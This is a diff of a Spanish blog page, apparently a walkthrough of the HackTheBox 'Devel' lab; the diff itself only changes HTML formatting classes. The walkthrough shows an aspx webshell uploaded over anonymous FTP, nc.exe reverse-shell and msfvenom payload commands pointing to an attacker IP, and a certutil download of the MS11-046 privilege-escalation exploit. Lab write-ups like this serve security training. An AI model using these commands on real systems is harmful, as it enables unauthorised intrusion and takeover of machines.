@@ -1,14 +1,14 @@
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/devel/02-tarjeta.png" />
 </p>
 
 <p>¡Hola!
-En esta ocasión vamos a resolver de la máquina <code class="highlighter-rouge">devel</code> de <a href="https://hackthebox.com/">HackTheBox</a>.
+En esta ocasión vamos a resolver de la máquina <code class="language-plaintext highlighter-rouge">devel</code> de <a href="https://hackthebox.com/">HackTheBox</a>.
 La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!</p>
 
 <h2 id="preparación">PREPARACIÓN</h2>
 
-<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="highlighter-rouge">devel</code> y los subdirectorios <code class="highlighter-rouge">recon</code> junto con <code class="highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
+<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="language-plaintext highlighter-rouge">devel</code> y los subdirectorios <code class="language-plaintext highlighter-rouge">recon</code> junto con <code class="language-plaintext highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkhack devel
 <span class="nb">cd</span> <span class="o">!</span><span class="nv">$/</span>recon
@@ -16,7 +16,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 
 <h2 id="reconocimiento">RECONOCIMIENTO</h2>
 
-<p>Accedemos al directorio <code class="highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
+<p>Accedemos al directorio <code class="language-plaintext highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="language-plaintext highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>osping 10.10.10.5
 
@@ -39,7 +39,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 80/tcp open  http
 </code></pre></div></div>
 
-<p>Luego de identificar los puertos abiertos <code class="highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
+<p>Luego de identificar los puertos abiertos <code class="language-plaintext highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> nmap <span class="nt">-p21</span>,80 <span class="nt">-sCV</span> 10.10.10.5 <span class="nt">-oN</span> versions
 PORT   STATE SERVICE VERSION
@@ -60,7 +60,7 @@ Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
 
 <h2 id="reconocimiento-ftp">RECONOCIMIENTO FTP</h2>
 
-<p>Iniciamos con el reconocimiento del servicio <code class="highlighter-rouge">ftp</code> donde inicialmente probamos el acceso al servicio con el usuario <code class="highlighter-rouge">anonymous</code> y sin contraseña, logando el acceso y la capacidad de ejecutar comandos en este servicio.</p>
+<p>Iniciamos con el reconocimiento del servicio <code class="language-plaintext highlighter-rouge">ftp</code> donde inicialmente probamos el acceso al servicio con el usuario <code class="language-plaintext highlighter-rouge">anonymous</code> y sin contraseña, logando el acceso y la capacidad de ejecutar comandos en este servicio.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.10.10.5
 Connected to 10.10.10.5.
@@ -81,24 +81,24 @@ ftp&gt; <span class="nb">dir
 
 <h2 id="reconocimiento-web">RECONOCIMIENTO WEB</h2>
 
-<p>Procedemos a revisar la página web por el puerto <code class="highlighter-rouge">80</code>, obteniendo una página por defecto de un servidor <code class="highlighter-rouge">IIS</code>.</p>
+<p>Procedemos a revisar la página web por el puerto <code class="language-plaintext highlighter-rouge">80</code>, obteniendo una página por defecto de un servidor <code class="language-plaintext highlighter-rouge">IIS</code>.</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/devel/03-page.png" />
 </p>
 
-<p>Inspeccionando el contenido podemos ver que la imagen se denomina como <code class="highlighter-rouge">welcome.png</code>, recurso que vimos anteriormente en el reconocimiento ftp.</p>
+<p>Inspeccionando el contenido podemos ver que la imagen se denomina como <code class="language-plaintext highlighter-rouge">welcome.png</code>, recurso que vimos anteriormente en el reconocimiento ftp.</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/devel/04-page2.png" />
 </p>
 
-<p>En esta ocasión mostraré dos maneras de realizar la intrusión a la máquina, pero antes de esto, vamos a ingresar a la carpeta <code class="highlighter-rouge">exploit</code></p>
+<p>En esta ocasión mostraré dos maneras de realizar la intrusión a la máquina, pero antes de esto, vamos a ingresar a la carpeta <code class="language-plaintext highlighter-rouge">exploit</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ../exploit
 </code></pre></div></div>
 <h2 id="intrusion-webshell">INTRUSION WEBSHELL</h2>
-<p>Vamos a localizar una webshell de <code class="highlighter-rouge">aspx</code> y la utilidad <code class="highlighter-rouge">nc.exe</code> para poder obtener nuestra primera intrusión.</p>
+<p>Vamos a localizar una webshell de <code class="language-plaintext highlighter-rouge">aspx</code> y la utilidad <code class="language-plaintext highlighter-rouge">nc.exe</code> para poder obtener nuestra primera intrusión.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>locate .aspx
 <span class="nb">cp</span> /usr/share/davtest/backdoors/aspx_cmd.aspx console.aspx
@@ -106,7 +106,7 @@ locate nc.exe
 <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
 </code></pre></div></div>
 
-<p>Nos conectamos nuevamente por <code class="highlighter-rouge">ftp</code> y cargamos la webshell que denominamos como <code class="highlighter-rouge">console.aspx</code>.</p>
+<p>Nos conectamos nuevamente por <code class="language-plaintext highlighter-rouge">ftp</code> y cargamos la webshell que denominamos como <code class="language-plaintext highlighter-rouge">console.aspx</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.10.10.5
 Connected to 10.10.10.5.
@@ -124,13 +124,13 @@ ftp&gt; put console.aspx
 1438 bytes sent <span class="k">in </span>0.00 secs <span class="o">(</span>18.7861 MB/s<span class="o">)</span>
 </code></pre></div></div>
 
-<p>Tenemos nuestra webshell en la máquina y lo podemos comprobar al ingresar al recurso en el navegador <code class="highlighter-rouge">http://10.10.10.5/console.aspx</code></p>
+<p>Tenemos nuestra webshell en la máquina y lo podemos comprobar al ingresar al recurso en el navegador <code class="language-plaintext highlighter-rouge">http://10.10.10.5/console.aspx</code></p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/devel/05-page3.png" />
 </p>
 
-<p>Activamos el servicio <code class="highlighter-rouge">smb</code> con <code class="highlighter-rouge">impacket</code> para compartir los archivos que tenemos en la carpeta <code class="highlighter-rouge">exploit</code>.</p>
+<p>Activamos el servicio <code class="language-plaintext highlighter-rouge">smb</code> con <code class="language-plaintext highlighter-rouge">impacket</code> para compartir los archivos que tenemos en la carpeta <code class="language-plaintext highlighter-rouge">exploit</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>
 </code></pre></div></div>
@@ -140,25 +140,25 @@ ftp&gt; put console.aspx
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap nc <span class="nt">-lvnp</span> 4564
 </code></pre></div></div>
 
-<p>En la webshell ingresamos el siguiente comando que nos va a permitir ejecutar <code class="highlighter-rouge">nc.exe</code> directamente en la máquina víctima y así generar una reverse shell.</p>
+<p>En la webshell ingresamos el siguiente comando que nos va a permitir ejecutar <code class="language-plaintext highlighter-rouge">nc.exe</code> directamente en la máquina víctima y así generar una reverse shell.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\\</span>10.10.14.15<span class="se">\s</span>mbFolder<span class="se">\n</span>c.exe <span class="nt">-e</span> cmd 10.10.14.15 4564
 </code></pre></div></div>
 
-<p>Finalmente obtenemos acceso a una shell de la máquina victima con el usuario <code class="highlighter-rouge">iis apppool\web</code>.</p>
+<p>Finalmente obtenemos acceso a una shell de la máquina victima con el usuario <code class="language-plaintext highlighter-rouge">iis apppool\web</code>.</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/devel/06-page4.png" />  
 </p>
 
 <h2 id="instusion-msfvenom">INSTUSION MSFVENOM</h2>
 
-<p>Para la siguiente intrusión vamos a crear con <code class="highlighter-rouge">msfvenom</code> una reverse shell indicando el formato <code class="highlighter-rouge">aspx</code>.</p>
+<p>Para la siguiente intrusión vamos a crear con <code class="language-plaintext highlighter-rouge">msfvenom</code> una reverse shell indicando el formato <code class="language-plaintext highlighter-rouge">aspx</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.15 <span class="nv">LPORT</span><span class="o">=</span>4564 <span class="nt">-f</span> aspx <span class="nt">-o</span> reverseShell.aspx
 </code></pre></div></div>
 
-<p>Cargamos la reverse shell al servidor <code class="highlighter-rouge">ftp</code>.</p>
+<p>Cargamos la reverse shell al servidor <code class="language-plaintext highlighter-rouge">ftp</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.10.10.5
 Connected to 10.10.10.5.
@@ -181,9 +181,9 @@ ftp&gt; put reverseShell.aspx
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap nc <span class="nt">-lvnp</span> 4564
 </code></pre></div></div>
 
-<p>En el navegador vamos a la ruta <code class="highlighter-rouge">http://10.10.10.5/reverseShell.aspx</code> y logramos tener acceso por otra vía a la máquina víctima.</p>
+<p>En el navegador vamos a la ruta <code class="language-plaintext highlighter-rouge">http://10.10.10.5/reverseShell.aspx</code> y logramos tener acceso por otra vía a la máquina víctima.</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/devel/07-page5.png" />  
 </p>
 
@@ -228,13 +228,13 @@ rlwrap nc <span class="nt">-lvnp</span> <span class="nv">$2</span> 2&gt;/dev/nul
 <span class="k">fi</span>
 </code></pre></div></div>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/devel/08-page6.png" />  
 </p>
 
 <h2 id="escalada-de-privilegios">ESCALADA DE PRIVILEGIOS</h2>
 
-<p>Realizamos como primer paso una enumeración basica, por medio del comando <code class="highlighter-rouge">systeminfo</code>, obteniendo información interesante en cuanto a la versión del sistema operativo actual.</p>
+<p>Realizamos como primer paso una enumeración basica, por medio del comando <code class="language-plaintext highlighter-rouge">systeminfo</code>, obteniendo información interesante en cuanto a la versión del sistema operativo actual.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systeminfo
 Host Name:                 DEVEL
@@ -242,17 +242,17 @@ OS Name:                   Microsoft Windows 7 Enterprise
 OS Version:                6.1.7600 N/A Build 7600
 </code></pre></div></div>
 
-<p>Luego de un poco de investigación de la versión de Windows <code class="highlighter-rouge">6.1.7600</code>, encontramos que es vulnerable al script <a href="https://github.com/abatchy17/WindowsExploits/raw/master/MS11-046/MS11-046.exe">MS11-046.exe</a> del github de <a href="https://github.com/abatchy17">abatchy17</a>, por ende, procedemos a descargar este recurso.</p>
+<p>Luego de un poco de investigación de la versión de Windows <code class="language-plaintext highlighter-rouge">6.1.7600</code>, encontramos que es vulnerable al script <a href="https://github.com/abatchy17/WindowsExploits/raw/master/MS11-046/MS11-046.exe">MS11-046.exe</a> del github de <a href="https://github.com/abatchy17">abatchy17</a>, por ende, procedemos a descargar este recurso.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/abatchy17/WindowsExploits/raw/master/MS11-046/MS11-046.exe
 </code></pre></div></div>
 
-<p>Al obtener el exploit, activamos un servidor <code class="highlighter-rouge">http</code> con <code class="highlighter-rouge">python</code> por el puerto <code class="highlighter-rouge">80</code>.</p>
+<p>Al obtener el exploit, activamos un servidor <code class="language-plaintext highlighter-rouge">http</code> con <code class="language-plaintext highlighter-rouge">python</code> por el puerto <code class="language-plaintext highlighter-rouge">80</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
 </code></pre></div></div>
 
-<p>En la máquina víctima realizamos la descarga desde la carpeta <code class="highlighter-rouge">C:\Windows\Temp</code> del exploit por medio de la utilidad <code class="highlighter-rouge">certutil.exe</code>.</p>
+<p>En la máquina víctima realizamos la descarga desde la carpeta <code class="language-plaintext highlighter-rouge">C:\Windows\Temp</code> del exploit por medio de la utilidad <code class="language-plaintext highlighter-rouge">certutil.exe</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp
 certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.15/MS11-046.exe
@@ -265,7 +265,7 @@ MS11-046.exe
 
 <h2 id="flags">FLAGS</h2>
 
-<p>Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con <code class="highlighter-rouge">type</code>, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.</p>
+<p>Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con <code class="language-plaintext highlighter-rouge">type</code>, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>C:<span class="se">\</span>
 <span class="nb">dir</span> /b/s user.txt
@@ -282,9 +282,9 @@ echo.%root:~0,10%
 655befe588
 </code></pre></div></div>
 
-<p>¡Hemos logrado completar la máquina <code class="highlighter-rouge">devel</code> de HackTheBox!</p>
+<p>¡Hemos logrado completar la máquina <code class="language-plaintext highlighter-rouge">devel</code> de HackTheBox!</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/devel/09-finish.png" />
 </p>
 
